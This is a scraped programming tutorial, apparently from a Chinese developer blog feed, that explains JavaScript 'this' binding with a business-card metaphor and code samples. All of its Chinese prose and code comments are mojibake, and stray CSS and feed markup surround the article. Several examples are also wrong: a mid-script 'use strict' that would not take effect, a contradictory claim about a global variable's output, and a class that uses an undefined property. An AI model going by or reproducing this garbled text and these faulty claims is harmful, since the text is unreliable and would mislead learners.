pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript this æŒ‡å‘ï¼šåˆ«å†æ­»è®°ç¡¬èƒŒï¼Œè¿™æ ·ç†è§£æœ€è½»æ¾ï¼</h2>
<h3 data-id="heading-1">å‰è¨€ï¼šä»ä¸€ä¸ªç”Ÿæ´»åœºæ™¯è¯´èµ·</h3>
<p>æƒ³è±¡ä¸€ä¸‹ä½ åœ¨ä¸åŒçš„åœºåˆä»‹ç»è‡ªå·±ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åœ¨å…¬å¸é‡Œ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">introduce</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æˆ‘æ˜¯"</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"ï¼Œåœ¨"</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">company</span> + <span class="hljs-string">"å·¥ä½œ"</span>);
}

<span class="hljs-comment">// åœºæ™¯1ï¼šä½œä¸ºå‘˜å·¥è‡ªæˆ‘ä»‹ç»</span>
<span class="hljs-keyword">var</span> employee = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"å°æ˜"</span>,
  <span class="hljs-attr">company</span>: <span class="hljs-string">"é˜¿é‡Œ"</span>,
  <span class="hljs-attr">intro</span>: introduce
};
employee.<span class="hljs-title function_">intro</span>(); <span class="hljs-comment">// "æˆ‘æ˜¯å°æ˜ï¼Œåœ¨é˜¿é‡Œå·¥ä½œ" - this æŒ‡å‘ employee</span>

<span class="hljs-comment">// åœºæ™¯2ï¼šæ¢ä¸ªç¯å¢ƒè¯´è¿™ä¸ªä»‹ç»</span>
<span class="hljs-keyword">var</span> say = employee.<span class="hljs-property">intro</span>;
<span class="hljs-title function_">say</span>(); <span class="hljs-comment">// "æˆ‘æ˜¯undefinedï¼Œåœ¨undefinedå·¥ä½œ" - this æŒ‡å‘ window</span>
</code></pre>
<p><strong>åŒä¸€ä¸ª"ä»‹ç»"çš„æ–¹å¼ï¼Œåœ¨ä¸åŒåœºåˆä¸‹ï¼Œè¯´çš„æ˜¯ä¸åŒçš„äººï¼</strong> è¿™å°±æ˜¯ this çš„æ ¸å¿ƒã€‚</p>
<hr/>
<h3 data-id="heading-2">ä¸€ã€ä¸ºä»€ä¹ˆ this ä¼šæŒ‡å‘å…¨å±€ï¼Ÿä¸€ä¸ª"å¿˜è®°å¸¦åç‰‡"çš„æ¯”å–»</h3>
<h4 data-id="heading-3">1.1 å…ˆçœ‹ä¸€ä¸ªæœ€ç®€å•çš„ä¾‹å­</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> myName = <span class="hljs-string">"å…¨å±€åå­—"</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">sayName</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">myName</span>);
}

<span class="hljs-title function_">sayName</span>(); <span class="hljs-comment">// è¾“å‡ºï¼š"å…¨å±€åå­—"</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆæŒ‡å‘å…¨å±€ï¼Ÿ</strong></p>
<p>æƒ³è±¡ä¸€ä¸‹ï¼š</p>
<ul>
<li><code>obj.method()</code> å°±åƒæ˜¯å°æ˜åœ¨å…¬å¸ä¼šè®®ä¸Šè¯´ï¼š"æˆ‘æ˜¯å…¬å¸çš„å°æ˜"</li>
<li><code>func()</code> å°±åƒæ˜¯å°æ˜åœ¨è¡—ä¸Šçªç„¶å–Šï¼š"æˆ‘æ˜¯è°ï¼Ÿ"</li>
<li>è¡—ä¸Šçš„è·¯äººï¼ˆå…¨å±€ç¯å¢ƒï¼‰é—®ï¼š"ä½ è¯´çš„æ˜¯è°çš„åå­—ï¼Ÿ"</li>
<li>å°æ˜è¯´ï¼š"æˆ‘æ²¡å¸¦åç‰‡ï¼Œå°±éšä¾¿å–Šå–Š"</li>
<li>äºæ˜¯å¤§å®¶é»˜è®¤ä»–è¯´çš„æ˜¯"è¡—ä¸Šçš„åäºº"ï¼ˆå…¨å±€å˜é‡ï¼‰</li>
</ul>
<h4 data-id="heading-4">1.2 å†çœ‹æˆ‘çš„å­¦ä¹ ç¬”è®°ä¸­çš„ä¾‹å­</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¿™æ˜¯ä½ çš„ 1.html ä¸­çš„ä¾‹å­</span>
<span class="hljs-keyword">var</span> bar = {
  <span class="hljs-attr">myName</span>: <span class="hljs-string">'time.geekbang.com'</span>,
  <span class="hljs-attr">printName</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myName);        <span class="hljs-comment">// æ‰¾å˜é‡ï¼ˆä½œç”¨åŸŸé“¾æŸ¥æ‰¾ï¼‰</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">myName</span>);   <span class="hljs-comment">// æ‰¾"å½“å‰åç‰‡"ä¸Šçš„åå­—</span>
  }
}

<span class="hljs-keyword">var</span> myName = <span class="hljs-string">'æå®¢é‚¦'</span>;
bar.<span class="hljs-title function_">printName</span>(); 
<span class="hljs-comment">// 1. "æå®¢é‚¦" - å˜é‡æŸ¥æ‰¾ï¼Œæ‰¾åˆ°å…¨å±€çš„</span>
<span class="hljs-comment">// 2. "time.geekbang.com" - this æŒ‡å‘ barï¼Œç”¨ bar çš„åå­—</span>

<span class="hljs-comment">// å…³é”®æ¥äº†ï¼</span>
<span class="hljs-keyword">var</span> _printName = bar.<span class="hljs-property">printName</span>; <span class="hljs-comment">// åªå¤åˆ¶äº†"è¯´è¯æ–¹å¼"ï¼Œæ²¡å¤åˆ¶"åç‰‡"</span>
<span class="hljs-title function_">_printName</span>();
<span class="hljs-comment">// 1. "æå®¢é‚¦" - è¿˜æ˜¯æ‰¾åˆ°å…¨å±€å˜é‡</span>
<span class="hljs-comment">// 2. undefined - this æŒ‡å‘ windowï¼Œwindow.myName ä¸å­˜åœ¨ï¼ˆå¦‚æœæ˜¯ var myName='æå®¢é‚¦'ï¼Œè¿™é‡Œä¼šè¾“å‡º"æå®¢é‚¦"ï¼‰</span>
</code></pre>
<hr/>
<h3 data-id="heading-5">äºŒã€this çš„ 5 ç§"è¯´è¯åœºåˆ"ï¼ˆå¯¹åº”ä½ çš„ç¬”è®°ï¼‰</h3>
<h4 data-id="heading-6">2.1 åœºåˆä¸€ï¼šä½œä¸ºå‘˜å·¥è¯´è¯ï¼ˆå¯¹è±¡æ–¹æ³•ï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½ çš„ 2.html ä¾‹å­</span>
<span class="hljs-keyword">var</span> myObj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'æå®¢æ—¶é—´'</span>,
  <span class="hljs-attr">showThis</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// æŒ‡å‘ myObj</span>
  }
}
myObj.<span class="hljs-title function_">showThis</span>(); <span class="hljs-comment">// åœ¨"å…¬å¸"è¯´ï¼Œè¯´çš„æ˜¯"å…¬å¸çš„äº‹"</span>
</code></pre>
<p><strong>æ¯”å–»</strong>ï¼šåœ¨å…¬å¸çš„ä¼šè®®å®¤é‡Œï¼Œä½ è¯´"æˆ‘ä»¬å…¬å¸"ï¼ŒæŒ‡çš„æ˜¯ä½ æ‰€åœ¨çš„å…¬å¸ã€‚</p>
<h4 data-id="heading-7">2.2 åœºåˆäºŒï¼šåœ¨è¡—ä¸Šè¯´è¯ï¼ˆæ™®é€šå‡½æ•°ï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½ çš„ç¬”è®°ä¸­æåˆ°ï¼š"æ™®é€šå‡½æ•°è¿è¡Œæ—¶ã€‚thisæŒ‡å‘å…¨å±€å¯¹è±¡ä¸Š"</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// window</span>
}
<span class="hljs-title function_">foo</span>();

<span class="hljs-comment">// ä¸¥æ ¼æ¨¡å¼å°±æ˜¯ï¼š"åˆ«ä¹±è¯´è¯ï¼"</span>
<span class="hljs-meta">'use strict'</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">strictFoo</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// undefined</span>
}
<span class="hljs-title function_">strictFoo</span>();
</code></pre>
<p><strong>æ¯”å–»</strong>ï¼šåœ¨è¡—ä¸Šå¤§å–Š"æˆ‘"ï¼Œæ²¡æœ‰äººçŸ¥é“ä½ è¯´çš„æ˜¯è°ï¼Œé»˜è®¤å°±æ˜¯"è¡—ä¸Šçš„äºº"ï¼ˆå…¨å±€ï¼‰ã€‚</p>
<h4 data-id="heading-8">2.3 åœºåˆä¸‰ï¼šå€Ÿåˆ«äººèº«ä»½è¯´è¯ï¼ˆcall/applyï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½ çš„ 2.html ç¬¬äºŒä¸ªä¾‹å­</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">myName</span> = <span class="hljs-string">'æå®¢æ—¶é—´'</span>;
}

<span class="hljs-keyword">let</span> bar = {
  <span class="hljs-attr">myName</span>: <span class="hljs-string">'æå®¢é‚¦'</span>,
  <span class="hljs-attr">test1</span>: <span class="hljs-number">1</span>
};

foo.<span class="hljs-title function_">call</span>(bar); <span class="hljs-comment">// "å€Ÿç”¨ bar çš„èº«ä»½è¯´è¯"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(bar.<span class="hljs-property">myName</span>); <span class="hljs-comment">// "æå®¢æ—¶é—´" - bar çš„åå­—è¢«æ”¹äº†ï¼</span>
</code></pre>
<p><strong>æ¯”å–»</strong>ï¼šä½ æ‹¿ç€åˆ«äººçš„åç‰‡è¯´ï¼š"æˆ‘æ˜¯XXX"ï¼Œåˆ«äººå°±æŠŠä½ å½“æˆé‚£ä¸ªäººäº†ã€‚</p>
<h4 data-id="heading-9">2.4 åœºåˆå››ï¼šæ–°äººè‡ªæˆ‘ä»‹ç»ï¼ˆæ„é€ å‡½æ•°ï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½ çš„ 4.html ä¾‹å­ï¼ˆä¿®æ­£ç‰ˆï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">CreateObj</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// new çš„æ—¶å€™ï¼šåˆ›å»ºä¸€ä¸ª"æ–°äºº"ï¼Œè®© this æŒ‡å‘ä»–</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">'æå®¢æ—¶é—´'</span>;
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// æŒ‡å‘æ–°åˆ›å»ºçš„å¯¹è±¡</span>
}

<span class="hljs-keyword">var</span> myObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CreateObj</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myObj.<span class="hljs-property">name</span>); <span class="hljs-comment">// "æå®¢æ—¶é—´"</span>
</code></pre>
<p><strong>æ¯”å–»</strong>ï¼šæ–°äººå…¥èŒæ—¶è¯´"æˆ‘æ˜¯æ–°æ¥çš„å°æ˜"ï¼Œè¿™æ—¶å€™çš„"æˆ‘"å°±æ˜¯æŒ‡å‘è¿™ä¸ªæ–°äººè‡ªå·±ã€‚</p>
<h4 data-id="heading-10">2.5 åœºåˆäº”ï¼šæŒ‰é’®è¢«ç‚¹å‡»æ—¶è¯´è¯ï¼ˆäº‹ä»¶å¤„ç†ï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½ çš„ 5.html ä¾‹å­</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'link'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// æŒ‡å‘è¢«ç‚¹å‡»çš„ &lt;a&gt; å…ƒç´ </span>
});
</code></pre>
<p><strong>æ¯”å–»</strong>ï¼šæŒ‰é’®è¢«æŒ‰æ—¶è¯´"æˆ‘è¢«æŒ‰äº†"ï¼Œè¯´çš„å°±æ˜¯æŒ‰é’®è‡ªå·±ã€‚</p>
<hr/>
<h3 data-id="heading-11">ä¸‰ã€æœ€å®¹æ˜“å‡ºé”™çš„"åç‰‡ä¸¢å¤±"é—®é¢˜</h3>
<h4 data-id="heading-12">3.1 çš„ç»å…¸æ¡ˆä¾‹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> myObj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"æå®¢æ—¶é—´"</span>,
  <span class="hljs-attr">showThis</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">'æå®¢é‚¦'</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>);
  }
}

<span class="hljs-comment">// ç¬¬ä¸€ç§ï¼šæ‹¿ç€åç‰‡è¯´è¯</span>
myObj.<span class="hljs-title function_">showThis</span>(); <span class="hljs-comment">// è¾“å‡º myObjï¼Œthis.name è¢«æ”¹ä¸º"æå®¢é‚¦"</span>

<span class="hljs-comment">// ç¬¬äºŒç§ï¼šåç‰‡ä¸¢äº†ï¼</span>
<span class="hljs-keyword">var</span> foo = myObj.<span class="hljs-property">showThis</span>; <span class="hljs-comment">// åªå¤åˆ¶äº†"è¯´è¯æ–¹å¼"</span>
<span class="hljs-title function_">foo</span>(); <span class="hljs-comment">// è¾“å‡º windowï¼Œthis.name æŠŠ window.name æ”¹äº†ï¼</span>
</code></pre>
<p><strong>å…³é”®ç†è§£</strong>ï¼š</p>
<ul>
<li><code>myObj.showThis</code> æ˜¯"å°æ˜çš„è¯´è¯æ–¹å¼"</li>
<li><code>var foo = myObj.showThis</code> åªæ˜¯å¤åˆ¶äº†"æ€ä¹ˆè¯´è¯"</li>
<li>æ²¡æœ‰å¤åˆ¶"å°æ˜çš„åç‰‡"</li>
<li>æ‰€ä»¥ <code>foo()</code> è¯´è¯æ—¶ï¼Œä¸çŸ¥é“è¯´è°ï¼Œé»˜è®¤è¯´å…¨å±€</li>
</ul>
<h4 data-id="heading-13">3.2 ç®­å¤´å‡½æ•°ï¼šè‡ªå¸¦åç‰‡å¤¹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> myObj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"æå®¢æ—¶é—´"</span>,
  <span class="hljs-attr">showThis</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// æ™®é€šå‡½æ•°ï¼šåç‰‡å¯èƒ½ä¼šä¸¢</span>
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// undefinedï¼Œåç‰‡ä¸¢äº†</span>
    }, <span class="hljs-number">100</span>);
    
    <span class="hljs-comment">// ç®­å¤´å‡½æ•°ï¼šæŠŠåç‰‡å¤¹åœ¨èº«ä¸Š</span>
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// "æå®¢æ—¶é—´"ï¼Œåç‰‡è¿˜åœ¨</span>
    }, <span class="hljs-number">100</span>);
  }
}
myObj.<span class="hljs-title function_">showThis</span>();
</code></pre>
<hr/>
<h3 data-id="heading-14">å››ã€ç»™ä½ çš„å­¦ä¹ ç¬”è®°è¡¥å……çš„"é¿å‘æŒ‡å—"</h3>
<h4 data-id="heading-15">4.1 ä¸ºä»€ä¹ˆä¼šæœ‰è¿™ç§è®¾è®¡ï¼Ÿ</h4>
<blockquote>
<p>"jsçš„ä½œè€…å¿˜äº†å¤„ç†è¿™ç§æƒ…å†µ...å·æ‡’...ç›´æ¥è®©jsæŒ‡å‘å…¨å±€ï¼Ÿ"</p>
</blockquote>
<p>æ›´å‡†ç¡®çš„ç†è§£æ˜¯ï¼š
<strong>æ—©æœŸ JavaScript æƒ³è®©ç½‘é¡µè„šæœ¬ç¼–å†™æ›´ç®€å•</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1995å¹´çš„ç½‘é¡µå¯èƒ½æ˜¯è¿™æ ·çš„</span>
&lt;button onclick=<span class="hljs-string">"changeColor()"</span>&gt;å˜çº¢è‰²&lt;/button&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// å¦‚æœæ²¡æœ‰å…¨å±€ thisï¼Œæ¯ä¸ªå‡½æ•°éƒ½è¦è¿™ä¹ˆå†™ï¼š</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">changeColor</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">'red'</span>;
  <span class="hljs-comment">// å¦‚æœ this ä¸æŒ‡å‘ windowï¼Œå°±å¾—å†™æˆ window.document...</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h4 data-id="heading-16">4.2 å¯¹è±¡åœ¨å†…å­˜çš„ä½ç½®</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//bar æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®šä¹‰åœ¨å…¨å±€ä½œç”¨åŸŸ</span>
<span class="hljs-comment">//å¯¹è±¡åœ¨å †å†…å­˜ åœ¨å˜é‡ç¯å¢ƒçš„æ ˆå†…å­˜ä¸­å­˜æ”¾çš„åªæ˜¯å¯¹è±¡åœ¨å †å†…å­˜ä¸­çš„åœ°å€</span>
</code></pre>
<p>å¯¹è±¡åœ¨å †é‡Œï¼Œå˜é‡åªæ˜¯å­˜äº†ä¸ªåœ°å€ã€‚åŒæ ·ï¼š</p>
<ul>
<li><code>this</code> ä¹Ÿæ˜¯ä¸ª"åœ°å€"ï¼ŒæŒ‡å‘å½“å‰è¯´è¯çš„å¯¹è±¡</li>
<li>å‡½æ•°è°ƒç”¨æ—¶ï¼Œæ‰ç¡®å®šè¿™ä¸ªåœ°å€æŒ‡å‘è°</li>
</ul>
<h4 data-id="heading-17">4.3 ä¸‰ä¸ªå®ç”¨çš„è®°å¿†å£è¯€</h4>
<ol>
<li>
<p><strong>"ç‚¹å‰æ˜¯è°å°±æ˜¯è°"</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">obj.<span class="hljs-title function_">method</span>(); <span class="hljs-comment">// this â†’ obj</span>
</code></pre>
</li>
<li>
<p><strong>"æ²¡äººç‚¹å°±æ‰¾å…¨å±€"</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">method</span>(); <span class="hljs-comment">// this â†’ windowï¼ˆéä¸¥æ ¼æ¨¡å¼ï¼‰</span>
</code></pre>
</li>
<li>
<p><strong>"ç®­å¤´å‡½æ•°çœ‹çˆ¸çˆ¸"</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">obj.<span class="hljs-property">method</span> = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// çœ‹å®šä¹‰æ—¶çš„å¤–å±‚ this</span>
};
</code></pre>
</li>
</ol>
<hr/>
<h3 data-id="heading-18">äº”ã€å®é™…å¼€å‘ä¸­çš„"ç”Ÿå­˜æ³•åˆ™"</h3>
<h4 data-id="heading-19">5.1 æ³•åˆ™ä¸€ï¼šä¸ç¡®å®šæ—¶ï¼Œå…ˆæ‰“å°çœ‹çœ‹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'this æ˜¯ï¼š'</span>, <span class="hljs-variable language_">this</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'this çš„ç±»å‹ï¼š'</span>, <span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">this</span>);
}

<span class="hljs-comment">// å„ç§æƒ…å†µéƒ½è¯•è¯•ï¼š</span>
<span class="hljs-title function_">test</span>();                    <span class="hljs-comment">// ç‹¬ç«‹è°ƒç”¨</span>
obj.<span class="hljs-property">test</span> = test; obj.<span class="hljs-title function_">test</span>(); <span class="hljs-comment">// ä½œä¸ºæ–¹æ³•</span>
<span class="hljs-keyword">new</span> <span class="hljs-title function_">test</span>();                <span class="hljs-comment">// æ„é€ å‡½æ•°</span>
test.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>);  <span class="hljs-comment">// æŒ‡å®š this</span>
</code></pre>
<h4 data-id="heading-20">5.2 æ³•åˆ™äºŒï¼šç”¨ bind æŠŠåç‰‡é’‰æ­»</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> obj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'å°æ˜'</span>,
  <span class="hljs-attr">say</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æˆ‘æ˜¯'</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  }
};

<span class="hljs-comment">// åç‰‡å®¹æ˜“ä¸¢</span>
<span class="hljs-keyword">var</span> say = obj.<span class="hljs-property">say</span>;
<span class="hljs-title function_">say</span>(); <span class="hljs-comment">// "æˆ‘æ˜¯undefined"</span>

<span class="hljs-comment">// ç”¨èƒ¶æ°´ç²˜ä½åç‰‡ï¼ˆbindï¼‰</span>
<span class="hljs-keyword">var</span> boundSay = obj.<span class="hljs-property">say</span>.<span class="hljs-title function_">bind</span>(obj);
<span class="hljs-title function_">boundSay</span>(); <span class="hljs-comment">// "æˆ‘æ˜¯å°æ˜" - åç‰‡ç²˜ä½äº†ï¼</span>
</code></pre>
<h4 data-id="heading-21">5.3 æ³•åˆ™ä¸‰ï¼šclass ä¸­æ³¨æ„ this</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Button</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">text</span> = <span class="hljs-string">'ç‚¹å‡»'</span>;
    
    <span class="hljs-comment">// âŒ è¿™æ ·ä¼šä¸¢åç‰‡</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleClick</span>);
    
    <span class="hljs-comment">// âœ… ç”¨ bind ç²˜ä½</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleClick</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>));
    
    <span class="hljs-comment">// âœ… æˆ–è€…ç”¨ç®­å¤´å‡½æ•°ï¼ˆè‡ªåŠ¨ç²˜ï¼‰</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleClick</span>();
    });
  }
  
  <span class="hljs-title function_">handleClick</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">text</span>); <span class="hljs-comment">// éœ€è¦æ­£ç¡®çš„ this</span>
  }
}
</code></pre>
<hr/>
<h3 data-id="heading-22">æ€»ç»“ï¼šä¸€å¼ å›¾æå®š this</h3>
<pre><code class="hljs language-javascript" lang="javascript">è°åœ¨è°ƒç”¨å‡½æ•°ï¼Ÿ            â†’ <span class="hljs-variable language_">this</span> æŒ‡å‘è°ï¼Ÿ
-----------              -----------
å¯¹è±¡.æ–¹æ³•()               â†’ è¿™ä¸ªå¯¹è±¡
æ–¹æ³•()                   â†’ å…¨å±€ï¼ˆæˆ– <span class="hljs-literal">undefined</span>ï¼‰
<span class="hljs-keyword">new</span> å‡½æ•°()               â†’ æ–°åˆ›å»ºçš„å¯¹è±¡
å‡½æ•°.<span class="hljs-title function_">call</span>(å¯¹è±¡)          â†’ call çš„ç¬¬ä¸€ä¸ªå‚æ•°
ç®­å¤´å‡½æ•°                 â†’ å®šä¹‰æ—¶çš„å¤–å±‚ <span class="hljs-variable language_">this</span>
</code></pre>
<p><strong>æœ€åè®°ä½</strong>ï¼š<code>this</code> å°±åƒæ˜¯ä½ è¯´è¯æ—¶çš„"æˆ‘"ã€‚</p>
<ul>
<li>åœ¨ä¼šè®®å®¤è¯´"æˆ‘" â†’ æŒ‡ä½ è‡ªå·±</li>
<li>åœ¨è¡—ä¸Šè¯´"æˆ‘" â†’ è¡—ä¸Šçš„äººä¸çŸ¥é“ä½ è¯´è°ï¼Œé»˜è®¤æŒ‡"è¡—ä¸Šçš„äºº"</li>
<li>æ‹¿ç€åˆ«äººåç‰‡è¯´"æˆ‘" â†’ æŒ‡åç‰‡ä¸Šçš„äºº</li>
<li>ç®­å¤´å‡½æ•°è¯´"æˆ‘" â†’ æ°¸è¿œæŒ‡ä½ çˆ¸çˆ¸æ˜¯è°ï¼Œä½ å°±æ˜¯è°</li>
</ul>
<p>å¤šå†™ä»£ç ï¼Œå¤šæ‰“å° <code>console.log(this)</code>ï¼Œå¾ˆå¿«ä½ å°±ä¼šå½¢æˆç›´è§‰ã€‚åŠ æ²¹ï¼</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Šæ‹†è§£ JS OOP éš¾ç‚¹ï¼šæ„é€ å‡½æ•°ã€åŸå‹ã€Class çš„åº•å±‚å…³è”ã€‹]]></title>    <link>https://juejin.cn/post/7602440800296271918</link>    <guid>https://juejin.cn/post/7602440800296271918</guid>    <pubDate>2026-02-03T14:33:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602440800296271918" data-draft-id="7602259669706063898" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Šæ‹†è§£ JS OOP éš¾ç‚¹ï¼šæ„é€ å‡½æ•°ã€åŸå‹ã€Class çš„åº•å±‚å…³è”ã€‹"/> <meta itemprop="keywords" content="JavaScript,å‰ç«¯"/> <meta itemprop="datePublished" content="2026-02-03T14:33:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" 